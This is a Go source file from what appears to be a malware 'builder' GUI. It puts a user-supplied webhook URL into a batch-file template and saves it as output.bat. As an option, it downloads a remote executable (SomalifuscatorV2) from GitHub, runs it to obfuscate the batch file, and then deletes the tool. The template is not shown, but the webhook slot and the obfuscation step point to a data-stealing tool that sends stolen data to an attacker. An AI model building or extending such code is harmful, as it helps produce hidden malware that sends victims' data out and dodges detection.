package batch

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"

	"builder/modules/options/utils"

	"fyne.io/fyne/v2"
)

func BuildBatchFile(a fyne.App, webhook string, obfuscate bool) {
	cwd, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
	}
	if !(utils.TestWebhook(a, webhook)) {
		utils.MakeErrorMessage(a, "Invalid webhook!")
	}
	batchCode := utils.GetBatCode()
	batchCode = strings.Replace(batchCode, "YOUR_WEBHOOK_HERE2", webhook, -1)
	err = os.WriteFile("output.bat", []byte(batchCode), 0644)
	if err != nil {
		fmt.Println(err)
	} else {
		if obfuscate {
			err = obfuscateCode("output.bat")
			if err != nil {
				utils.MakeErrorMessage(a, "An error occured while obfuscating the code"+err.Error())
				return
			}
		}
		utils.MakeSuccessMessage(a, "Compiled BAT file successfully! Location is at "+cwd+"\\output.bat")
	}
}

func obfuscateCode(file string) error {
	somalifuscatorPath, err := downloadSomalifuscatorV2()
	if err != nil {
		return err
	}

	//run somalifuscator aginst the file
	cmd := exec.Command(somalifuscatorPath, "-f", file)
	cmd.Run()

	//remove the original file
	err = os.Remove(file)
	if err != nil {
		return err
	}

	_ = os.Remove("settings.json")

	err = os.Remove(somalifuscatorPath)
	if err != nil {
		return err
	}

	err = os.Rename("output_obf.bat", "output.bat")
	if err != nil {
		return err
	}
	return nil
}

func downloadSomalifuscatorV2() (string, error) {
	var url string = "https://github.com/KDot227/SomalifuscatorV2/releases/download/AutoBuild/main.exe"
	var somaliString string = "somalifuscator.exe"

	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	//place the exe in the same directory as the builder
	out, err := os.Create(somaliString)
	if err != nil {
		return "", err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return "", err
	}

	cwd, err := os.Getwd()
	if err != nil {
		return "", err
	}

	return cwd + "\\" + somaliString, nil
}
